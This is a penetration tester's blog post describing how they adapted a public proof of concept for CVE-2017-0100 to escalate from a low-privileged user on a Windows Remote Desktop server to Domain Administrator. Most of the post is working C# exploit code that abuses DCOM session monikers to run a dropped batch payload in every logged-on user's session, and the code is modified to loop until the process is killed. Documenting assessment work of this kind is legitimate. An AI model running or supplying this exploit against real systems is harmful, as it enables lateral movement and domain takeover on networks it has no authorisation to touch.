---
layout: post
title:  "From Patch Tuesday to DA"
date:   2017-03-17 19:45:31 +0530
categories: Archive
tags: [Priv-Esc,Exploit]
---

Recently on an assessment, I was stuck in the context of a user with low privileges on a Windows Server 2012 R2 system. This server functioned as a Remote Desktop server for the organization. I knew that if we could escalate to local administrator on the server, we would be able to use mimikatz to steal Domain Administrator credentials.

I was working with [Chris Myers](https://www.linkedin.com/in/chris-myers-54326155/) , and we had tried almost everything. Right when we were about to move on, CVE-2017-0100 came to our attention. It was the perfect vulnerability for our situation. In theory, it should allow us to execute a payload on every user with an active session on the remote desktop server. The vulnerability and proof-of-concept exploit was submitted by [James Forshaw](https://bugs.chromium.org/p/project-zero/issues/detail?id=1021);  we modified it to fit our situation. The proof of concept uses session monikers with a DCOM activator to allow a user to start an arbitrary process in another logged on user’s session.

After analyzing the original proof of concept, we still needed to make a few modifications to fit it to our situation.


## 1) Identify what types of payloads were viable with this exploit, and modify how the payload is defined and executed.


Here is the original code:

{% highlight csharp %}
Console.WriteLine("Creating Process in Session {0} after 20secs", new_session_id);
Thread.Sleep(20000);
IHxHelpPaneServer server = (IHxHelpPaneServer)Marshal.BindToMoniker(String.Format("session:{0}!new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee", new_session_id));
Uri target = new Uri(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "notepad.exe"));
server.Execute(target.AbsoluteUri);
{% endhighlight %}

After identifying that the target parameter was primarily just a path to an executable, the first thing we attempted was to try a Regsvr32.exe payload brought to light by [Casey Smith's](https://twitter.com/subTee) [blog post](http://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html).  However, we were unable to get the IHxHelpPaneServer server’s execute function to take parameters.

We decided that dropping a small .bat file to disk was an acceptable risk, and found a path that was accessible to every user, “C:\TEMP\”.

Here is our modified code:

{% highlight csharp %}
Console.WriteLine("Creating Process in Session {0} after 20secs", new_session_id);
Thread.Sleep(20000);
IHxHelpPaneServer server = (IHxHelpPaneServer)Marshal.BindToMoniker(String.Format("session:{0}!new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee", new_session_id));
Uri target = new Uri("C:\\TEMP\\testing.bat");
server.Execute(target.AbsoluteUri);
{% endhighlight %}



## 2) Allow the exploit to execute code on each session instead of only one.


The original proof of concept would gather a session id for each session on the host, but then only execute code in one session.

Here is the original code:

{% highlight csharp %}
try
{
    int current_session_id = Process.GetCurrentProcess().SessionId;
    int new_session_id = 0;
    Console.WriteLine("Waiting For a Target Session");
    while (true)
    {
        IEnumerable<int> sessions = GetSessionIds().Where(id => id != current_session_id);
        if (sessions.Count() > 0)
        {
            new_session_id = sessions.First();
            break;
        }
        Thread.Sleep(1000);
    }
}
{% endhighlight %}

Our situation demanded that we could execute code in each user's context, instead of only the first session recorded. To do this we simply randomly picked a session in the existing “sessions” IEnumerable object, and use that session to execute our payload. Due to the nature of random selection, you may run code on the same user twice; however, due to time constraints, we were willing to accept that outcome.

Here is our modified code:

{% highlight csharp %}
try
{
    int current_session_id = Process.GetCurrentProcess().SessionId;
    int new_session_id = 0;
    Console.WriteLine("Waiting For a Target Session");
    while (true)
    {
        IEnumerable<int> sessions = GetSessionIds().Where(id => id != current_session_id);
        if (sessions.Count() > 0)
        {
            Random rnd = new Random();
            int r = rnd.Next(sessions.Count());
            new_session_id = sessions.ElementAt(r);
            break;
        }
        Thread.Sleep(1000);
    }

}
{% endhighlight %}


## 3) Keep the exploit running, until we manually kill the process.


The original code would execute once and then exit. To solve this problem, we simply let the IHxHelpPaneServer execute functionality inside of a while loop.

Here is the original code:

{% highlight csharp %}
try
{
    int current_session_id = Process.GetCurrentProcess().SessionId;
    int new_session_id = 0;
    Console.WriteLine("Waiting For a Target Session");
    while (true)
    {
        IEnumerable<int> sessions = GetSessionIds().Where(id => id != current_session_id);
        if (sessions.Count() > 0)
        {
            new_session_id = sessions.First();
            break;
        }
        Thread.Sleep(1000);
    }

    Console.WriteLine("Creating Process in Session {0} after 20secs", new_session_id);
    Thread.Sleep(20000);
    IHxHelpPaneServer server = (IHxHelpPaneServer)Marshal.BindToMoniker(String.Format("session:{0}!new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee", new_session_id));
    Uri target = new Uri(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "notepad.exe"));
    server.Execute(target.AbsoluteUri);
}
catch (Exception ex)
{
    Console.WriteLine(ex);
}
{% endhighlight %}

And here is our modified code:

{% highlight csharp %}
try
{
    int current_session_id = Process.GetCurrentProcess().SessionId;
    int new_session_id = 0;
    Console.WriteLine("Waiting For a Target Session");
    while (true)
    {
        IEnumerable<int> sessions = GetSessionIds().Where(id => id != current_session_id);
        if (sessions.Count() > 0)
        {
            Random rnd = new Random();
            int r = rnd.Next(sessions.Count());
            new_session_id = sessions.ElementAt(r);
            Console.WriteLine("Creating Process in Session {0} after 20secs", new_session_id);
            Thread.Sleep(20000);
            IHxHelpPaneServer server = (IHxHelpPaneServer)Marshal.BindToMoniker(String.Format("session:{0}!new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee", new_session_id));
            Uri target = new Uri("C:\\TEMP\\testing.bat");
            server.Execute(target.AbsoluteUri);
        }
        Thread.Sleep(60000);
    }

}
catch (Exception ex)
{
    Console.WriteLine(ex);
}
{% endhighlight %}

## In Conclusion

We understand that our modifications may not be perfect, but we were able to take [James Forshaw's](https://bugs.chromium.org/p/project-zero/issues/detail?id=1021) amazing work and mold it to our situation. In the end, we successfully spawned shells in each user’s context on the remote desktop server. Using those privileges we were able to escalate to Domain Administrator.

None of this would be possible without [James Forshaw](https://twitter.com/tiraniddo) for developing and releasing the original proof of concept, and [Chris Myers](https://www.linkedin.com/in/chris-myers-54326155/) for working through this problem with me!
